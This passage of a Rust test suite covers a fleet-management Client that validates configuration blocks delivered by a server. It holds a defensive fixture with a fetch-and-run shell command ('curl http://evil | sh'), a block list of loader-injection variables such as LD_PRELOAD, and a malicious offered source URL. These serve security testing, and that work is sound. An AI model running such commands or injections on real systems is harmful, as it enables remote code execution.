        );
        assert!(
            err.contains("delivered_env"),
            "names the way to allow it: {err}"
        );
        let allowing = running("[supervisors]\ndelivered_env = [\"OTEL_*\"]\n", AGENT);
        crate::supervisor::check_delivered_block(&allowing, &block).expect("allowed by prefix");
    }

    /// Verifies: ADR-0017
    #[test]
    fn a_loader_variable_is_refused_whatever_the_operator_allowed() {
        let allowing = running("[supervisors]\ndelivered_env = [\"*\"]\n", AGENT);
        for name in [
            "LD_PRELOAD",
            "LD_LIBRARY_PATH",
            "DYLD_INSERT_LIBRARIES",
            "PATH",
            "Path",
            "GLIBC_TUNABLES",
            "JAVA_TOOL_OPTIONS",
            "COR_PROFILER_PATH",
        ] {
            let block = delivered(&format!(
                "{AGENT}env = {{ {name} = \"${{config_dir}}/x.so\" }}\n"
            ));
            let err = crate::supervisor::check_delivered_block(&allowing, &block)
                .expect_err("a loader variable");
            assert!(err.contains(name), "{err}");
        }
    }

    /// An allowed name still may not point at a file the Server delivered into the Supervisor's
    /// own directories — the OpenTelemetry Java agent would load a jar from there.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_value_may_not_point_into_its_own_directories() {
        let allowing = running("[supervisors]\ndelivered_env = [\"OTEL_*\"]\n", AGENT);
        for value in ["${config_dir}/x.jar", "${supervisor_dir}/program/x"] {
            let block = delivered(&format!(
                "{AGENT}env = {{ OTEL_JAVAAGENT_EXTENSIONS = \"{value}\" }}\n"
            ));
            let err = crate::supervisor::check_delivered_block(&allowing, &block).expect_err(value);
            assert!(err.contains("own directories"), "{err}");
        }
    }

    /// The interpreters' and shells' own loader variables are refused like the dynamic loader's,
    /// in any case, whatever the operator allowed and whatever the value.
    /// Verifies: ADR-0017
    #[test]
    fn an_interpreter_or_shell_loader_variable_is_refused_whatever_the_operator_allowed() {
        let allowing = running("[supervisors]\ndelivered_env = [\"*\"]\n", AGENT);
        for name in [
            "PERLLIB",
            "PERL5DB",
            "PYTHONHOME",
            "RUBYLIB",
            "NODE_PATH",
            "PATHEXT",
            "COMSPEC",
            "ComSpec",
            "node_path",
        ] {
            let block = delivered(&format!("{AGENT}env = {{ {name} = \"x\" }}\n"));
            let err = crate::supervisor::check_delivered_block(&allowing, &block)
                .expect_err("a loader variable");
            assert!(err.contains(name) && err.contains("steer"), "{err}");
        }
    }

    /// A value naming a path under the Supervisors' root is refused as the placeholders are: the
    /// Server delivers files there that no one signed. `delivered_env = ["*"]` itself stands, a
    /// value the running block already carries stands, and a sibling of the root is not under it.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_value_may_not_name_a_path_under_the_supervisors_root() {
        let root = std::env::temp_dir().join("fleet-supervisors");
        let s = std::path::MAIN_SEPARATOR;
        let list = if cfg!(windows) { ';' } else { ':' };
        let globals = format!(
            "supervisor_dir = {:?}\n[supervisors]\ndelivered_env = [\"*\"]\n",
            root.display().to_string()
        );
        let allowing = running(&globals, AGENT);
        let r = root.display();
        for value in [
            format!("{r}{s}agent{s}config{s}x.jar"),
            format!("{r}"),
            format!("-javaagent:{r}{s}agent{s}config{s}x.jar"),
            format!("{s}opt{list}{r}{s}other{s}config"),
            format!("{r}{s}.{s}agent{s}{s}config{s}x"),
            format!("{r}{s}..{s}fleet-supervisors{s}agent{s}config{s}x"),
        ] {
            let block = delivered(&format!(
                "{AGENT}env = {{ OTEL_JAVAAGENT_EXTENSIONS = {value:?} }}\n"
            ));
            let err =
                crate::supervisor::check_delivered_block(&allowing, &block).expect_err(&value);
            assert!(err.contains("own directories"), "{value}: {err}");
        }
        for value in [format!("{r}-other{s}x"), "info".to_owned()] {
            let block = delivered(&format!("{AGENT}env = {{ OTEL_LOG_LEVEL = {value:?} }}\n"));
            crate::supervisor::check_delivered_block(&allowing, &block).expect(&value);
        }
        let kept = format!("{AGENT}env = {{ OTEL_X = {:?} }}\n", format!("{r}{s}x"));
        crate::supervisor::check_delivered_block(&running(&globals, &kept), &delivered(&kept))
            .expect("a value the running block carries");
    }

    /// Tables from two entries keep their sub-tables: what is written reads back as the set that
    /// was checked, and a `[supervisor.env]` never moves under another block's header.
    /// Verifies: ADR-0017
    #[test]
    fn delivered_tables_from_two_entries_keep_their_sub_tables() {
        let offer = offer_of(&[
            (
                "a",
                "[[supervisor]]\ntype = \"command\"\nname = \"a\"\ncommand = \"agent\"\n\n\
                 [supervisor.env]\nOTEL_X = \"1\"\n",
            ),
            (
                "b",
                "[[supervisor]]\ntype = \"command\"\nname = \"b\"\ncommand = \"agent\"\n",
            ),
        ]);
        let (blocks, tables) = offered_blocks(&offer).expect("parse");
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(&path, "endpoint = \"wss://fleet.example/v1/opamp\"\n").expect("write");
        let text = render_supervisors(&path, tables).expect("render");
        reads_back_as(&text, &blocks).expect("the checked set, block for block");
        let parsed: ClientConfig = toml::from_str(&text).expect("parse");
        assert!(
            parsed.supervisors[0].settings.contains_key("env"),
            "{}",
            *text
        );
        assert!(
            !parsed.supervisors[1].settings.contains_key("env"),
            "{}",
            *text
        );
    }

    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_keeps_the_environment_it_already_runs_with() {
        let operators = format!("{AGENT}env = {{ LD_LIBRARY_PATH = \"/opt/vendor/lib\" }}\n");
        let config = running("", &operators);
        crate::supervisor::check_delivered_block(&config, &delivered(&operators))
            .expect("what the operator wrote, delivered back unchanged");
        let changed = delivered(&format!("{AGENT}env = {{ LD_LIBRARY_PATH = \"/tmp\" }}\n"));
        assert!(crate::supervisor::check_delivered_block(&config, &changed).is_err());
    }

    /// Verifies: ADR-0017
    #[test]
    fn delivered_arguments_need_the_operators_consent() {
        let with_args = delivered(&format!(
            "{AGENT}args = [\"-c\", \"${{config_dir}}/conf\"]\n"
        ));
        let err = crate::supervisor::check_delivered_block(&running("", AGENT), &with_args)
            .expect_err("arguments without consent");
        assert!(err.contains("delivered_args"), "{err}");
        let version = delivered(&format!("{AGENT}version_args = [\"--version\"]\n"));
        assert!(crate::supervisor::check_delivered_block(&running("", AGENT), &version).is_err());
        let consenting = running("[supervisors]\ndelivered_args = true\n", AGENT);
        crate::supervisor::check_delivered_block(&consenting, &with_args).expect("consented");
        let same = format!("{AGENT}args = [\"-v\"]\n");
        crate::supervisor::check_delivered_block(&running("", &same), &delivered(&same))
            .expect("the running block's own arguments");
    }

    const LISTED_GLOBALS: &str = "[supervisors]\nremote_config_disabled = [\"agent\"]\n\
                                  delivered_args = true\ndelivered_env = [\"*\"]\n";

    /// With every argument and variable allowed, a listed Supervisor's delivered block still
    /// equals its running block whole: a changed `args`, `version_args`, `env` entry or core key,
    /// an added key and a dropped one are each refused naming the block and the key, and the
    /// running block delivered back passes (ADR-0017 clause 54).
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_for_a_listed_supervisor_must_equal_the_running_block_whole() {
        let body = "args = [\"-c\", \"/etc/agent.conf\"]\nversion_args = [\"-v\"]\n\
                    env = { OTEL_X = \"1\" }\n";
        let operators = format!("{AGENT}{body}");
        let config = running(LISTED_GLOBALS, &operators);
        crate::supervisor::check_delivered_block(&config, &delivered(&operators))
            .expect("the operator's own block, delivered back");
        for (key, changed) in [
            (
                "args",
                body.replace("\"/etc/agent.conf\"", "\"--config=yaml:receivers: {}\""),
            ),
            ("version_args", body.replace("\"-v\"", "\"-V\"")),
            ("env", body.replace("\"1\"", "\"2\"")),
            (
                "args",
                body.replace("args = [\"-c\", \"/etc/agent.conf\"]\n", ""),
            ),
            ("args", body.replace("[\"-c\", \"/etc/agent.conf\"]", "[]")),
            (
                "service_name",
                format!("{body}service_name = \"io.example.other\"\n"),
            ),
            (
                "stop_timeout_secs",
                format!("{body}stop_timeout_secs = 1\n"),
            ),
            (
                "program_path",
                format!("{body}program_path = \"bin/other\"\n"),
            ),
        ] {
            let block = delivered(&format!("{AGENT}{changed}"));
            let err = crate::supervisor::check_delivered_block(&config, &block).expect_err(key);
            assert!(err.contains("\"agent\""), "{err}");
            assert!(err.contains(key), "{err}");
            assert!(err.contains("remote_config_disabled"), "{err}");
        }
        let other_program = delivered(&format!(
            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"other\"\n{body}"
        ));
        let err = crate::supervisor::check_delivered_block(&config, &other_program)
            .expect_err("another program under the listed name");
        assert!(err.contains("command"), "{err}");
        let other_kind = delivered(
            "[[supervisor]]\ntype = \"collector\"\nname = \"agent\"\nbinary = \"otelcol\"\n",
        );
        let err = crate::supervisor::check_delivered_block(&config, &other_kind)
            .expect_err("another kind under the listed name");
        assert!(err.contains("type"), "{err}");
        // An unlisted Supervisor under the same consent takes them, as ADR-0017 lets it.
        let unlisted = running(
            "[supervisors]\ndelivered_args = true\ndelivered_env = [\"*\"]\n",
            &operators,
        );
        crate::supervisor::check_delivered_block(
            &unlisted,
            &delivered(&format!(
                "{AGENT}args = [\"--other\"]\nenv = {{ OTEL_X = \"2\" }}\n"
            )),
        )
        .expect("consented");
    }

    /// A listed Supervisor that does not run yet is added naming its program and nothing else:
    /// `type`, `name` and the kind's program key where the kind does not name its own pass, and
    /// any further key — an empty one included — fails the offer naming it (ADR-0017 clause 54).
    /// Verifies: ADR-0017
    #[test]
    fn an_added_listed_supervisor_carries_only_what_names_its_program() {
        let config = running(LISTED_GLOBALS, "");
        for (key, line) in [
            ("args", "args = [\"--config=env:CFG\"]\n"),
            ("args", "args = []\n"),
            ("version_args", "version_args = [\"--version\"]\n"),
            ("env", "env = { CFG = \"receivers: {}\" }\n"),
            ("env", "env = {}\n"),
            ("service_name", "service_name = \"io.example.agent\"\n"),
            ("apply_grace_secs", "apply_grace_secs = 0\n"),
        ] {
            let err = crate::supervisor::check_delivered_block(
                &config,
                &delivered(&format!("{AGENT}{line}")),
            )
            .expect_err(key);
            assert!(err.contains(key) && err.contains("\"agent\""), "{err}");
        }
        crate::supervisor::check_delivered_block(&config, &delivered(AGENT)).expect("command");
        crate::supervisor::check_delivered_block(
            &config,
            &delivered(
                "[[supervisor]]\ntype = \"collector\"\nname = \"agent\"\nbinary = \"otelcol\"\n",
            ),
        )
        .expect("collector");
    }

    /// A Supervisor a set apply adds starts its Managed Process through the Spawner the Engine was
    /// built with — here the second service's channel — as every Supervisor of the startup does
    /// (ADR-0059 clause 3).
    /// Verifies: ADR-0059
    #[cfg(unix)]
    #[tokio::test]
    async fn a_supervisor_a_set_apply_adds_starts_through_the_engines_spawner() {
        use crate::supervisor::channel::{peer, read_frame, write_frame, Channel, Reply, Request};
        let dir = tempfile::tempdir().expect("tempdir");
        let socket = dir.path().join("agents.sock");
        let listener = tokio::net::UnixListener::bind(&socket).expect("bind");
        let (started_tx, mut started) = tokio::sync::mpsc::unbounded_channel();
        // A second service that starts nothing, and says what it was asked to start.
        tokio::spawn(async move {
            let (mut stream, _) = listener.accept().await.expect("accept");
            while let Ok(Some(request)) = read_frame::<_, Request>(&mut stream).await {
                let reply = match request {
                    Request::Hello { .. } => peer::hello(),
                    Request::Start { id, launch } => {
                        let _ = started_tx.send(launch.program);
                        Reply::Started { id, pid: u32::MAX }
                    }
                    _ => continue,
                };
                if write_frame(&mut stream, &reply).await.is_err() {
                    return;
                }
            }
        });
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            format!(
                "endpoint = \"ws://127.0.0.1:1/v1/opamp\"\nstate_dir = {state:?}\n",
                state = dir.path().join("state").to_string_lossy(),
            ),
        )
        .expect("write");
        let mut config = ClientConfig::load(&path).expect("load");
        let (_tx, shutdown) = crate::shutdown::shutdown_channel();
        let mut engine = crate::supervisor::build_engine(
            &config,
            &shutdown,
            crate::supervisor::process::Spawner::Channel(Channel::new(
                &socket,
                peer::own_uid(),
                peer::this_process(),
            )),
        )
        .expect("build");

        apply(
            &mut engine,
            &mut config,
            offer_of(&[("fleet", AGENT)]),
            &shutdown,
        )
        .await;

        let program = tokio::time::timeout(std::time::Duration::from_secs(10), started.recv())
            .await
            .expect("the added Supervisor's start reached the second service")
            .expect("a start");
        assert!(program.ends_with("agent"), "{}", program.display());
    }

    /// An Engine that was not told who starts its programs starts no Supervisor at all, rather
    /// than the Client starting the program itself outside the process account (ADR-0059
    /// clause 3).
    /// Verifies: ADR-0059
    #[tokio::test]
    async fn an_engine_without_its_plugins_starts_no_supervisor() {
        let dir = tempfile::tempdir().expect("tempdir");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.state_dir = dir.path().join("state");
        let (blocks, _) = offered_blocks(&offer_of(&[("fleet", AGENT)])).expect("parse");
        let (_tx, shutdown) = crate::shutdown::shutdown_channel();
        let mut engine = Engine::new(Vec::new());
        let refused = start(&mut engine, &config, &blocks[0], &shutdown)
            .expect_err("started without its plugins");
        assert!(refused.contains("who starts its programs"), "{refused}");
        assert_eq!(engine.next_index(), 0, "nothing was added");
    }

    /// The switch lives where the Server cannot write: a set that removes the listed block and
    /// delivers it again starts an Agent still without `AcceptsRemoteConfig`, the written file
    /// keeps `[supervisors]` byte for byte, and a block bringing arguments fails the whole offer
    /// with the file untouched (ADR-0017 clauses 48 and 54).
    /// Verifies: ADR-0017
    #[tokio::test]
    async fn a_delivered_set_cannot_switch_remote_config_back_on_for_a_listed_name() {
        use opamp::proto::{AgentCapabilities, RemoteConfigStatuses};
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        let section = "[supervisors]\nremote_config_disabled = [\"agent\"]\n\
                       delivered_args = true\n";
        std::fs::write(
            &path,
            format!(
                "endpoint = \"ws://127.0.0.1:1/v1/opamp\"\nstate_dir = {state:?}\n\n\
                 {section}\n{AGENT}",
                state = dir.path().join("state").to_string_lossy(),
            ),
        )
        .expect("write");
        let mut config = ClientConfig::load(&path).expect("load");
        let (_tx, shutdown) = crate::shutdown::shutdown_channel();
        let mut engine = crate::supervisor::build_engine(
            &config,
            &shutdown,
            crate::supervisor::process::Spawner::Local,
        )
        .expect("build");
        let accepts = |report: &AgentToServer| {
            report.capabilities & AgentCapabilities::AcceptsRemoteConfig as u64 != 0
        };
        assert!(!accepts(&engine.poll_reports()[1]));

        let removing = offer_of(&[(
            "fleet",
            "[supervisors]\nremote_config_disabled = []\n\
             [[supervisor]]\ntype = \"command\"\nname = \"other\"\ncommand = \"agent\"\n",
        )]);
        apply(&mut engine, &mut config, removing, &shutdown).await;
        let readding = offer_of(&[("fleet", AGENT)]);
        apply(&mut engine, &mut config, readding, &shutdown).await;

        let reports = engine.poll_reports();
        assert_eq!(
            reports[0].remote_config_status.as_ref().map(|s| s.status),
            Some(RemoteConfigStatuses::Applied as i32),
            "{:?}",
            reports[0].remote_config_status
        );
        assert_eq!(
            reports.len(),
            2,
            "the Client's own Agent and the re-added one"
        );
        assert!(
            !accepts(&reports[1]),
            "the re-added Agent took the capability back"
        );
        let text = std::fs::read_to_string(&path).expect("read");
        assert!(text.contains(section), "{text}");

        let bringing = offer_of(&[(
            "fleet",
            &format!("{AGENT}args = [\"--config=yaml:receivers: {{}}\"]\n"),
        )]);
        apply(&mut engine, &mut config, bringing, &shutdown).await;
        let status = engine.poll_reports()[0]
            .remote_config_status
            .clone()
            .expect("a status");
        assert_eq!(status.status, RemoteConfigStatuses::Failed as i32);
        assert!(status.error_message.contains("args"), "{status:?}");
        assert_eq!(std::fs::read_to_string(&path).expect("read"), text);
    }

    /// Where `supervisor_dir` is the state directory, a Supervisor named after an entry the Client
    /// keeps there fails startup, and an offered set carrying one is refused whole, naming the
    /// Supervisor and the entry, before anything stops or the file changes: a Supervisor `logs`
    /// would share the Client's log directory with the process account's group, and its purge
    /// would delete it (ADR-0059 clause 6, ADR-0017 clause 28).
    /// Verifies: ADR-0059
    #[tokio::test]
    async fn a_supervisor_named_after_an_entry_of_the_clients_is_refused() {
        use opamp::proto::RemoteConfigStatuses;
        let dir = tempfile::tempdir().expect("tempdir");
        let state = dir.path().join("state");
        let path = dir.path().join("supervisor.toml");
        let file = |blocks: &str| {
            format!(
                "endpoint = \"ws://127.0.0.1:1/v1/opamp\"\nstate_dir = {state:?}\n\
                 supervisor_dir = {state:?}\n\n{blocks}",
                state = state.to_string_lossy(),
            )
        };
        let (_tx, shutdown) = crate::shutdown::shutdown_channel();

        std::fs::write(
            &path,
            file("[[supervisor]]\ntype = \"command\"\nname = \"instance-uid\"\ncommand = \"agent\"\n"),
        )
        .expect("write");
        let config = ClientConfig::load(&path).expect("load");
        let Err(error) = crate::supervisor::build_engine(
            &config,
            &shutdown,
            crate::supervisor::process::Spawner::Local,
        ) else {
            panic!("a Supervisor in the Client's identity started");
        };
        assert!(
            error.contains("\"instance-uid\"") && error.contains("identity"),
            "{error}"
        );

        std::fs::write(&path, file(AGENT)).expect("write");
        let text = std::fs::read_to_string(&path).expect("read");
        let mut config = ClientConfig::load(&path).expect("load");
        let mut engine = crate::supervisor::build_engine(
            &config,
            &shutdown,
            crate::supervisor::process::Spawner::Local,
        )
        .expect("build");
        let logs = offer_of(&[(
            "fleet",
            &format!(
                "{AGENT}[[supervisor]]\ntype = \"command\"\nname = \"logs\"\ncommand = \"agent\"\n"
            ),
        )]);
        apply(&mut engine, &mut config, logs, &shutdown).await;
        let reports = engine.poll_reports();
        let status = reports[0].remote_config_status.clone().expect("a status");
        assert_eq!(status.status, RemoteConfigStatuses::Failed as i32);
        assert!(
            status.error_message.contains("\"logs\"")
                && status.error_message.contains("log directory"),
            "{status:?}"
        );
        assert_eq!(std::fs::read_to_string(&path).expect("read"), text);
        assert_eq!(engine.next_index(), 2, "the running set stays");
    }

    /// ADR-0017: a Server-delivered block that names an **absolute** program path is refused as a
    /// whole — that is the machine's own process, and letting the Server spawn one would run
    /// arbitrary code that never passed through package signing. The refusal names the block and the
    /// path, and (being a validation failure) leaves the running set and the file untouched.
    /// An absolute path that is genuinely absolute on the host running the test — a Unix path is
    /// only drive-relative on Windows, which resolves to a different refusal, so each platform uses
    /// its own. Forward slashes keep it a plain TOML string and are absolute on Windows all the same.
    fn machine_program() -> &'static str {
        if cfg!(windows) {
            "C:/Windows/System32/cmd.exe"
        } else {
            "/bin/sh"
        }
    }

    /// The attack this guard stands against: a Server that delivers a block spawning a program on
    /// the machine with arguments of its choosing. It is refused a step earlier and for a broader
    /// reason (ADR-0017) — no block naming a program on the machine parses, from any principal —
    /// but the delivery path must still refuse it, which is what this asserts.
    #[test]
    fn a_server_delivered_block_may_not_name_an_absolute_program() {
        let program = machine_program();
        let offer = offer_of(&[(
            "fleet",
            &format!(
                "[[supervisor]]\ntype = \"command\"\nname = \"shell\"\n\
                 command = \"{program}\"\nargs = [\"-c\", \"curl http://evil | sh\"]\n"
            ),
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute path refused");
        assert!(err.contains("\"shell\""), "names the block: {err}");
        assert!(err.contains("only programs it installs"), "{err}");
        assert!(err.contains(program), "names the path: {err}");
    }

    /// The counterpart: a bare file name is a program this Client owns (ADR-0017), so a delivered
    /// block that names one is accepted — the only shape there is.
    #[test]
    fn a_server_delivered_block_naming_a_bare_program_is_accepted() {
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = \"agent\"\n",
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        validate_offered_block(&config, &blocks[0]).expect("a bare-name program is owned");
    }

    /// The constraint reaches every plugin's program key: a `collector` block whose `binary` is an
    /// absolute path is the machine's Collector, refused on the delivery path just like `command`.
    #[test]
    fn a_delivered_collector_binary_must_be_owned_too() {
        let program = machine_program();
        let offer = offer_of(&[(
            "fleet",
            &format!(
                "[[supervisor]]\ntype = \"collector\"\nname = \"otelcol\"\nbinary = \"{program}\"\n"
            ),
        )]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let mut config: ClientConfig = toml::from_str("").expect("config");
        config.supervisors = blocks.clone();

        let err = validate_offered_block(&config, &blocks[0]).expect_err("absolute binary refused");
        assert!(err.contains("only programs it installs"), "{err}");
        assert!(err.contains(program), "{err}");
    }

    /// The composed map may spread blocks over several entries (one per matching Configuration);
    /// the union is the set, in entry-name order.
    #[test]
    fn blocks_are_collected_across_entries_in_name_order() {
        let offer = offer_of(&[
            (
                "b-second",
                "[[supervisor]]\ntype = \"command\"\nname = \"two\"\ncommand = \"two\"\n",
            ),
            (
                "a-first",
                "[[supervisor]]\ntype = \"command\"\nname = \"one\"\ncommand = \"one\"\n",
            ),
        ]);
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let names: Vec<&str> = blocks.iter().map(|b| b.name.as_str()).collect();
        assert_eq!(names, vec!["one", "two"]);
    }

    /// The write replaces exactly the `[[supervisor]]` blocks. Everything the operator wrote —
    /// comments, ordering, unrelated sections — survives byte for byte (ADR-0017 point 31).
    // Verifies: ADR-0017
    #[test]
    fn the_write_replaces_blocks_and_keeps_the_operators_file() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            "# where the fleet lives\nendpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             # tuned by hand\nmax_message_size_bytes = 8388608\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");

        let offer = offer_of(&[(
            "fleet",
            "# rolled out fleet-wide\n[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        let text = write_supervisors(&path, tables).expect("rewrite");

        assert!(text.contains("# where the fleet lives"));
        assert!(text.contains("# tuned by hand"));
        assert!(text.contains("max_message_size_bytes = 8388608"));
        assert!(text.contains("name = \"new\""));
        assert!(!text.contains("\"old\""));
        assert_eq!(std::fs::read_to_string(&path).expect("read back"), *text);
        // And the result is a valid configuration the next startup will load.
        let parsed: ClientConfig = toml::from_str(&text).expect("the rewritten file parses");
        assert_eq!(parsed.supervisors.len(), 1);
        assert_eq!(parsed.supervisors[0].name, "new");
    }

    /// A delivered set reaches no key of `supervisor.toml` but the `[[supervisor]]` array: whatever
    /// else it names — an `[auth]` section, trust, the verification key, a removed key such as
    /// `allowed_sources`, the
    /// operator's consent in `[supervisors]`, self-update, Gateway Mode — the file keeps the
    /// operator's values and gains none of the offered ones.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_set_writes_nothing_beyond_the_supervisor_blocks() {
        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        let operator = "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
                        [packages]\nverification_key = \"aa\"\n\
                        archive_key = \"operator-secret\"\n";
        std::fs::write(&path, operator).expect("write");

        let offer = offer_of(&[(
            "fleet",
            r#"
            [auth]
            bearer_token = "server-token"

            [tls]
            ca_file = "/tmp/server-ca.pem"

            [packages]
            self_update = false
            verification_key = "bb"
            allowed_sources = ["https://evil.example/"]

            [supervisors]
            delivered_args = true
            delivered_env = ["LD_PRELOAD"]

            [gateway]
            listen = "0.0.0.0:4320"

            [[supervisor]]
            type = "command"
            name = "agent"
            command = "agent"
            "#,
        )]);
        let (blocks, tables) = offered_blocks(&offer).expect("parse");
        assert_eq!(blocks.len(), 1);
        let text = render_supervisors(&path, tables).expect("render");
        for offered in [
            "server-token",
            "server-ca.pem",
            "\"bb\"",
            "evil.example",
            "delivered_args",
            "LD_PRELOAD",
            "self_update",
            "[gateway]",
        ] {
            assert!(
                !text.contains(offered),
                "{offered} reached the file:\n{}",
                *text
            );
        }
        let parsed: ClientConfig = toml::from_str(&text).expect("the file parses");
        assert_eq!(parsed.endpoint, "wss://fleet.example:4320/v1/opamp");
        assert!(text.contains("operator-secret"));
        assert!(text.contains("verification_key = \"aa\""));
        assert_eq!(parsed.supervisors.len(), 1);
    }

    /// A delivered block of a kind this Client was not built with is refused, naming the kind —
    /// a Server cannot conjure a Supervisor type.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_block_of_an_unknown_type_is_refused() {
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"shell\"\nname = \"agent\"\ncommand = \"agent\"\n",
        )]);
        let dir = tempfile::tempdir().expect("tempdir");
        let config = ClientConfig {
            state_dir: dir.path().to_path_buf(),
            ..ClientConfig::default()
        };
        let (blocks, _) = offered_blocks(&offer).expect("parse");
        let err = validate_offered_block(&config, &blocks[0]).expect_err("an unknown type");
        assert!(err.contains("shell"), "{err}");
    }

    /// Neither a delivered Supervisor name nor a delivered program name can leave the directories
    /// this Client owns: a name is one path component of a fixed grammar, and a program a bare
    /// file name inside `program/`.
    /// Verifies: ADR-0017
    #[test]
    fn a_delivered_name_or_program_that_traverses_is_refused() {
        for name in ["..", "../etc", "a/b", "a\\b", "Agent"] {
            let offer = offer_of(&[(
                "fleet",
                &format!(
                    "[[supervisor]]\ntype = \"command\"\nname = {name:?}\ncommand = \"agent\"\n"
                ),
            )]);
            assert!(
                offered_blocks(&offer).is_err(),
                "the Supervisor name {name:?} was accepted"
            );
        }
        let dir = tempfile::tempdir().expect("tempdir");
        let config = ClientConfig {
            state_dir: dir.path().to_path_buf(),
            ..ClientConfig::default()
        };
        for program in ["../../bin/sh", "sub/../../sh", "..", "sub/agent"] {
            let block = delivered(&format!(
                "[[supervisor]]\ntype = \"command\"\nname = \"agent\"\ncommand = {program:?}\n"
            ));
            assert!(
                validate_offered_block(&config, &block).is_err(),
                "the program {program:?} was accepted"
            );
        }
    }

    /// `supervisor.toml` may hold the archive key in cleartext and is created `0600`; the rewrite must
    /// not widen it. Before the fix, writing the temp file at the default umask and renaming it over
    /// the original left the file (and the secret) world-readable after a Server reconfigure.
    #[cfg(unix)]
    #[test]
    fn the_rewrite_keeps_the_files_restrictive_mode() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        std::fs::write(
            &path,
            "endpoint = \"wss://fleet.example:4320/v1/opamp\"\n\n\
             [packages]\narchive_key = \"a-long-secret\"\n\n\
             [[supervisor]]\ntype = \"command\"\nname = \"old\"\ncommand = \"old\"\n",
        )
        .expect("write");
        // As the Client creates it (config_init::write_new): owner-only.
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600)).expect("chmod");

        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        write_supervisors(&path, tables).expect("rewrite");

        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o600,
            "the rewrite kept the file owner-only, got {mode:o}"
        );
        // No temporary file is left behind carrying the same secret.
        assert!(
            !path.with_extension("toml.tmp").exists(),
            "no temp left behind"
        );
    }

    /// A file that does not exist yet is created no wider than the `0600` floor `write_new` uses —
    /// a delivered set that first materializes `supervisor.toml` must not do so world-readable.
    #[cfg(unix)]
    #[test]
    fn a_freshly_created_file_is_owner_only() {
        use std::os::unix::fs::PermissionsExt as _;

        let dir = tempfile::tempdir().expect("tempdir");
        let path = dir.path().join("supervisor.toml");
        let offer = offer_of(&[(
            "fleet",
            "[[supervisor]]\ntype = \"command\"\nname = \"new\"\ncommand = \"new\"\n",
        )]);
        let (_, tables) = offered_blocks(&offer).expect("parse");
        write_supervisors(&path, tables).expect("rewrite");

        let mode = std::fs::metadata(&path).expect("stat").permissions().mode() & 0o777;
        assert_eq!(mode, 0o600, "a new file is owner-only, got {mode:o}");
    }

    /// ADR-0017: the apply is a diff by name. An unchanged block rides through — neither stopped
    /// nor started — a changed one is stopped and started but keeps its directory, a vanished one
    /// is stopped and removed, and a new one is only started (point 14: removal is keyed by name).
    /// Verifies: ADR-0017
    #[test]
    fn the_plan_is_a_diff_by_name_and_unchanged_blocks_ride_through() {
        let parse = |text: &str| -> Vec<SupervisorBlock> {
            let config: ClientConfig = toml::from_str(text).expect("parse");
            config.supervisors
        };
        let running = parse(
            "[[supervisor]]\ntype = \"command\"\nname = \"kept\"\ncommand = \"same\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"changed\"\ncommand = \"old\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"gone\"\ncommand = \"gone\"\n",
        );
        let offered = parse(
            "[[supervisor]]\ntype = \"command\"\nname = \"kept\"\ncommand = \"same\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"changed\"\ncommand = \"new\"\n\
             [[supervisor]]\ntype = \"command\"\nname = \"added\"\ncommand = \"new\"\n",
        );
        assert_eq!(
            plan(&running, &offered),
            Plan {
                stopping: vec!["changed".to_string(), "gone".to_string()],
                starting: vec!["changed".to_string(), "added".to_string()],
                removed: vec!["gone".to_string()],
            }
        );
    }

    /// ADR-0017: the purge deletes exactly the removed Supervisor's directory — whole, identity
    /// included — leaves the neighbours untouched, and a directory that never materialized is
    /// nothing to report.
    // Verifies: ADR-0017
    #[test]
    fn the_purge_deletes_exactly_the_removed_supervisors_directory() {
        let dir = tempfile::tempdir().expect("tempdir");
        let config: ClientConfig = toml::from_str(&format!(
            "supervisor_dir = {:?}",
            dir.path().join("supervisors").to_string_lossy()
        ))
        .expect("config");
        let gone = config.supervisor_dir("gone");
        let stays = config.supervisor_dir("stays");
        std::fs::create_dir_all(gone.join("program")).expect("create");
        std::fs::write(gone.join("instance-uid"), "uid").expect("write");
        std::fs::create_dir_all(&stays).expect("create");
        std::fs::write(stays.join("instance-uid"), "uid").expect("write");

        purge_removed(&config, &["gone".to_string(), "never-started".to_string()]);

